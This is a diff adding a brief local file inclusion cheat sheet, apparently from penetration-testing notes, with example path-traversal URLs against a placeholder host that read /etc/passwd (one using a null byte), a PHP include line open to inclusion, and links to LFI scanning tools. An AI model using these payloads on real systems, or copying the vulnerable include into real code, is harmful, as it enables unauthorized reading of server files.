@@ -1,0 +1,18 @@
+--LFI--
+
+Relate : Path/Directory Traversal, SSRF
+Attack Type : LFI, RFI
+
+http://vulnerable_host/preview.php?file=example.html
+http://vulnerable_host/preview.php?file=../../../../etc/passwd
+http://vulnerable_host/preview.php?file=../../../../etc/passwd%00
+
+Normal php Payload : <?php include($_GET['file'].".php"); ?>
+
+Tools:
+https://github.com/capture0x/Lfi-Space
+https://github.com/capture0x/LFI-FINDER
+https://github.com/mzfr/liffy
+https://github.com/hansmach1ne/LFImap
+
+
